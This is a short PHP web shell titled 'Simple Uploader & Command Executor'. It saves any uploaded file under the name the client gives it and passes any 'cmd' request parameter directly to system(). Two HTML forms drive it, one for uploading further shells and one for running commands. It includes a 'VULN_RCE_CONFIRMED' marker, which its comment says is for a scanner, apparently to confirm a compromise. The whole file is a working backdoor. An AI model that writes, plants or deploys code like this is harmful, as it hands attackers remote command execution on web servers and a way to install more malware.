<?php
// Simple Uploader & Command Executor
if(isset($_FILES['file'])){
    $file = $_FILES['file'];
    $name = $file['name'];
    if(move_uploaded_file($file['tmp_name'], $name)){
        echo "Upload Success: <a href='$name'>$name</a>";
    } else {
        echo "Upload Failed";
    }
}
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
    die;
}
?>
<!-- Marker for scanner -->
VULN_RCE_CONFIRMED

<hr>
<h3>Simple Shell Uploader</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload Shell Lain">
</form>
<hr>
<h3>Command Executor</h3>
<form method="post">
    <input type="text" name="cmd" size="50" placeholder="ls -la">
    <input type="submit" value="Execute">
</form>
